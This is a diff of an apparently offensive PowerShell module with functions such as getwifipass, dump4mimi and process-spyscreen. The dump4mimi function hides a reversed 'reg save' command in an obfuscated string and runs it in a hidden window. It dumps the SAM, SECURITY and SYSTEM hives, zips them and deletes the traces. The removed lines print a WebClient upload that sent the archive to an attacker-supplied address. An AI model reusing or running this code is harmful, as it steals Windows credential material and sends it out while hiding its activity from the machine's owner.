@@ -82,11 +82,6 @@ Export-ModuleMember -Function getwifipass
 Set-Alias -Name getwifipass -Value getwifipass
 
 function dump4mimi {
-   [CmdletBinding()]
-    param (
-        [string]$Value
-        )
-        $atk = $Value
 	$ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
 	sleep(6.0)
@@ -97,13 +92,10 @@ function dump4mimi {
 	start-process cmd "/c $sp1k3 " -WindowStyle hidden
 
     clear
-    sleep(1.7)
+    sleep(1.5)
     cd C:\
     Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
-    sleep(0.8)
-    $filetagPath = "$env:userprofile\d4m.zip"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.UploadFile($atk, $filetagPath) > $null 2>&1
+    sleep(0.5)
     clear
 	Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
 	Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
@@ -374,6 +366,7 @@ Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
 }
 Export-ModuleMember -Function process-spyscreen 
 Set-Alias -Name process-spyscreen -Value process-spyscreen
+
 
 function uninstaller {
     [CmdletBinding()]
